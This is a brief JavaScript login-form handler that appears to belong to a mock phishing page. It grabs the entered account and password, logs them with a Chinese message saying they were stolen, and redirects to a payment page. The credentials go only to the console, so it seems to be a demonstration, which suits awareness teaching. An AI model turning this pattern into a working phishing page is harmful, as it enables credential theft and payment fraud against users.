document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll("input");
    const account = inputs[0].value;
    const password = inputs[1].value;

    if (account && password) {
        console.log("偷到帳號密碼：", account, password);
        window.location.href = "payment.html";
    } else {
        document.getElementById("loginError").textContent = "請輸入完整帳密。";
    }
});
